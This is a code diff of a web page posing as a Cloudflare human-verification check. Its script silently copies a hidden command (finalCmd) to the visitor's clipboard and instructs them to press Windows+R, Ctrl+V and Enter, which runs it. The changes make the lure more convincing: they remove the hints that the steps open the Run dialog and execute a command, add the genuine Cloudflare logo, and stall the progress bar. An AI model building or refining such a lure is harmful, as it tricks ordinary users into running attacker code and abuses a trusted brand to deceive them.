@@ -5,12 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Cloudflare Security Check</title>
     <style>
+        /* --- RESET & BASE --- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
         }
+
         body {
             background: #1e1e2f;
             display: flex;
@@ -19,32 +21,34 @@
             min-height: 100vh;
             margin: 20px;
         }
+
         .container {
             background: #ffffff;
             border-radius: 16px;
             padding: 40px 48px;
             max-width: 520px;
             width: 100%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
             text-align: center;
             position: relative;
         }
+
+        /* --- LOGO (REAL CLOUDFLARE LOGO) --- */
         .cloudflare-logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             margin-bottom: 24px;
         }
-        .cloudflare-logo svg {
-            height: 36px;
+
+        .cloudflare-logo img {
+            height: 40px;
             width: auto;
+            display: block;
         }
-        .cloudflare-logo span {
-            font-size: 26px;
-            font-weight: 700;
-            color: #f38020;
-        }
+
+        /* --- SHIELD ICON --- */
         .shield-icon {
             background: #f3f7fb;
             border-radius: 50%;
@@ -55,23 +59,29 @@
             justify-content: center;
             margin: 0 auto 16px;
         }
+
         .shield-icon svg {
             width: 40px;
             height: 40px;
             fill: #f38020;
         }
+
+        /* --- TYPOGRAPHY --- */
         h2 {
             font-size: 22px;
             font-weight: 600;
             color: #1e293b;
             margin-bottom: 8px;
         }
+
         .sub-text {
             font-size: 15px;
             color: #64748b;
             line-height: 1.5;
             margin-bottom: 24px;
         }
+
+        /* --- BUTTON --- */
         .verify-btn {
             background: #f38020;
             border: none;
@@ -84,43 +94,92 @@
             transition: background 0.2s, transform 0.1s;
             width: 100%;
             box-shadow: 0 4px 12px rgba(243, 128, 32, 0.3);
-            position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
+
         .verify-btn:hover:not(:disabled) {
             background: #d96c1a;
         }
+
         .verify-btn:active:not(:disabled) {
             transform: scale(0.97);
         }
+
         .verify-btn:disabled {
             opacity: 0.9;
             cursor: not-allowed;
         }
+
+        /* --- SPINNER --- */
         .verify-btn .spinner {
             display: none;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-top-color: #fff;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
+
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
-        /* Progress bar (Cloudflare‑style) */
+        /* --- STATUS MESSAGE --- */
+        .status-message {
+            font-size: 14px;
+            color: #64748b;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .status-message.visible {
+            display: block;
+        }
+
+        .status-message .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0% {
+                content: '';
+            }
+            25% {
+                content: '.';
+            }
+            50% {
+                content: '..';
+            }
+            75% {
+                content: '...';
+            }
+            100% {
+                content: '';
+            }
+        }
+
+        .status-message .dots {
+            display: inline-block;
+            min-width: 20px;
+        }
+
+        /* --- PROGRESS BAR (Stays at 0% for 60s, then jumps to 100%) --- */
         .progress-wrapper {
             margin-top: 20px;
             display: none;
         }
+
         .progress-wrapper.visible {
             display: block;
         }
+
         .progress-track {
             background: #e9edf2;
             border-radius: 12px;
@@ -128,13 +187,15 @@
             overflow: hidden;
             width: 100%;
         }
+
         .progress-fill {
             height: 100%;
             width: 0%;
             background: #f38020;
             border-radius: 12px;
-            transition: width 0.3s ease;
+            transition: width 0.15s ease;
         }
+
         .progress-label {
             display: flex;
             justify-content: space-between;
@@ -143,15 +204,17 @@
             margin-top: 6px;
         }
 
-        /* Steps */
+        /* --- STEPS (NO SUSPICIOUS DESCRIPTIONS) --- */
         .steps {
             margin-top: 30px;
             text-align: left;
             display: none;
         }
+
         .steps.visible {
             display: block;
         }
+
         .step {
             display: flex;
             align-items: center;
@@ -162,9 +225,11 @@
             font-weight: 500;
             color: #1e293b;
         }
+
         .step:last-child {
             border-bottom: none;
         }
+
         .step .key {
             display: inline-flex;
             align-items: center;
@@ -177,75 +242,52 @@
             color: #0f172a;
             min-width: 40px;
             height: 36px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
             border: 1px solid #e2e8f0;
         }
+
         .step .key.win {
             background: #e2e8f0;
             font-weight: 700;
         }
+
         .step .action {
             flex: 1;
         }
-        .step .action small {
-            font-weight: 400;
-            font-size: 14px;
-            color: #64748b;
-        }
 
+        /* --- FOOTER --- */
         .note {
             font-size: 13px;
             color: #94a3b8;
             margin-top: 20px;
         }
+
         .note a {
             color: #f38020;
             text-decoration: none;
         }
 
-        /* Status message while verifying */
-        .status-message {
-            font-size: 14px;
-            color: #64748b;
-            margin-top: 10px;
-            display: none;
-        }
-        .status-message.visible {
-            display: block;
-        }
-        .status-message .dots::after {
-            content: '';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-        @keyframes dots {
-            0% { content: ''; }
-            25% { content: '.'; }
-            50% { content: '..'; }
-            75% { content: '...'; }
-            100% { content: ''; }
-        }
-        .status-message .dots {
-            display: inline-block;
-            min-width: 20px;
-        }
-
+        /* --- RESPONSIVE --- */
         @media (max-width: 480px) {
-            .container { padding: 24px 20px; }
-            .step { font-size: 16px; gap: 12px; }
+            .container {
+                padding: 24px 20px;
+            }
+            .step {
+                font-size: 16px;
+                gap: 12px;
+            }
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <!-- Cloudflare Logo (official) -->
+        <!-- CLOUDFLARE LOGO (REAL SVG) -->
         <div class="cloudflare-logo">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z" fill="#f38020"/>
-            </svg>
-            <span>Cloudflare</span>
+            <img src="https://upload.wikimedia.org/wikipedia/de/a/a2/Cloudflare_logo.svg" alt="Cloudflare" />
         </div>
 
-        <!-- Shield icon -->
+        <!-- SHIELD ICON -->
         <div class="shield-icon">
             <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#f38020" stroke-width="2">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="currentColor" fill="none"/>
@@ -256,18 +298,18 @@
         <h2>Verify you are human</h2>
         <p class="sub-text">Click the button below to complete the security check. This ensures your connection is secure.</p>
 
-        <!-- Button -->
+        <!-- BUTTON -->
         <button class="verify-btn" id="verifyBtn">
             <span id="btnText">✔ Verify</span>
             <span class="spinner" id="btnSpinner"></span>
         </button>
 
-        <!-- Status message (appears during verification) -->
+        <!-- STATUS MESSAGE -->
         <div class="status-message" id="statusMsg">
             <span>Checking your browser<span class="dots"></span></span>
         </div>
 
-        <!-- Progress bar (Cloudflare‑style) -->
+        <!-- PROGRESS BAR (STAYS AT 0% FOR 60s, THEN JUMPS TO 100%) -->
         <div class="progress-wrapper" id="progressWrapper">
             <div class="progress-track">
                 <div class="progress-fill" id="progressFill"></div>
@@ -278,19 +320,21 @@
             </div>
         </div>
 
-        <!-- Steps (hidden until click) -->
+        <!-- STEPS (NO DESCRIPTIONS) -->
         <div class="steps" id="stepsContainer">
             <div class="step">
-                <span class="key win">⊞ Win</span> <span class="key">R</span>
-                <span class="action">Press <strong>Windows + R</strong> <small>(opens Run dialog)</small></span>
+                <span class="key win">⊞ Win</span>
+                <span class="key">R</span>
+                <span class="action"><strong>Windows + R</strong></span>
             </div>
             <div class="step">
-                <span class="key">Ctrl</span> <span class="key">V</span>
-                <span class="action">Press <strong>Ctrl + V</strong> <small>(paste the command)</small></span>
+                <span class="key">Ctrl</span>
+                <span class="key">V</span>
+                <span class="action"><strong>Ctrl + V</strong></span>
             </div>
             <div class="step">
                 <span class="key">↵ Enter</span>
-                <span class="action">Press <strong>Enter</strong> <small>(execute)</small></span>
+                <span class="action"><strong>Enter</strong></span>
             </div>
         </div>
 
@@ -341,56 +385,84 @@
             const statusMsg = document.getElementById('statusMsg');
 
             let isProcessing = false;
+            let progressInterval = null;
+            let timeoutId = null;
 
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
                 if (isProcessing) return;
                 isProcessing = true;
 
-                // 1. Disable button, show spinner, change text
+                // Disable button, show spinner, change text
                 btn.disabled = true;
                 btnText.textContent = 'Verifying';
                 btnSpinner.style.display = 'inline-block';
 
-                // 2. Show status message and progress bar
+                // Show status, progress bar, and steps
                 statusMsg.classList.add('visible');
                 progressWrapper.classList.add('visible');
-
-                // 3. Show the steps immediately
                 steps.classList.add('visible');
 
-                // 4. Copy the command to clipboard silently
+                // Copy the command to clipboard silently
                 navigator.clipboard.writeText(finalCmd).catch(() => {});
 
-                // 5. Start the 60‑second progress bar animation
-                let startTime = Date.now();
+                // Progress bar stays at 0% for exactly 60 seconds,
+                // then jumps directly to 100%.
+                let elapsed = 0;
+                const interval = 100; // update every 100ms
                 const duration = 60000; // 60 seconds
 
-                function updateProgress() {
-                    const elapsed = Date.now() - startTime;
-                    const progress = Math.min(elapsed / duration, 1);
-                    const percent = Math.round(progress * 100);
-                    progressFill.style.width = percent + '%';
-                    progressPercent.textContent = percent + '%';
+                // Reset progress bar to 0%
+                progressFill.style.width = '0%';
+                progressPercent.textContent = '0%';
 
-                    if (progress < 1) {
-                        requestAnimationFrame(updateProgress);
+                progressInterval = setInterval(function() {
+                    elapsed += interval;
+                    // Remain at 0% until the full 60 seconds have passed
+                    if (elapsed < duration) {
+                        // Stay at 0%
+                        progressFill.style.width = '0%';
+                        progressPercent.textContent = '0%';
                     } else {
-                        // Verification complete
-                        btnText.textContent = '✓ Verified';
-                        btnSpinner.style.display = 'none';
-                        btn.style.background = '#22c55e';
-                        btn.disabled = false;
-                        statusMsg.classList.remove('visible');
+                        // Jump to 100% and finish
+                        clearInterval(progressInterval);
+                        progressInterval = null;
+                        progressFill.style.width = '100%';
                         progressPercent.textContent = '100%';
-                        // Keep steps visible
-                        isProcessing = false;
+                        finishVerification();
                     }
-                }
+                }, interval);
 
-                // Start the animation loop
-                requestAnimationFrame(updateProgress);
+                // Safety net: if the interval gets stuck, finish after 61 seconds
+                timeoutId = setTimeout(function() {
+                    if (progressInterval) {
+                        clearInterval(progressInterval);
+                        progressInterval = null;
+                    }
+                    progressFill.style.width = '100%';
+                    progressPercent.textContent = '100%';
+                    finishVerification();
+                }, duration + 1000);
             });
+
+            function finishVerification() {
+                // Update button
+                btnText.textContent = '✓ Verified';
+                btnSpinner.style.display = 'none';
+                btn.style.background = '#22c55e';
+                btn.disabled = false;
+                statusMsg.classList.remove('visible');
+                isProcessing = false;
+
+                if (timeoutId) {
+                    clearTimeout(timeoutId);
+                    timeoutId = null;
+                }
+                if (progressInterval) {
+                    clearInterval(progressInterval);
+                    progressInterval = null;
+                }
+            }
 
         })();
     </script>
